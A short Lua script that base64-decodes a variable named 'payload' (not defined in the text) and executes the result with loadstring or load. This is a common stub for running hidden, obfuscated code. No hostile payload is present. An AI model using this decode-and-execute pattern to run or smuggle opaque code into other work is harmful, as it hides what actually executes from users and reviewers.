local alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local lookup = {}
for i = 1, #alphabet do lookup[alphabet:sub(i, i)] = i - 1 end
local function decode64(input)
    local out, buffer, bits = {}, 0, 0
    for i = 1, #input do
        local c = input:sub(i, i)
        if c ~= "=" then
            local v = lookup[c]
            if v then
                buffer = buffer * 64 + v
                bits = bits + 6
                if bits >= 8 then
                    bits = bits - 8
                    local byte = math.floor(buffer / (2 ^ bits)) % 256
                    out[#out + 1] = string.char(byte)
                    buffer = buffer % (2 ^ bits)
                end
            end
        end
    end
    return table.concat(out)
end
local source = decode64(payload)
local runner = loadstring or load
assert(runner, "This environment does not support loadstring/load")
local chunk, err = runner(source)
assert(chunk, err)
return chunk()
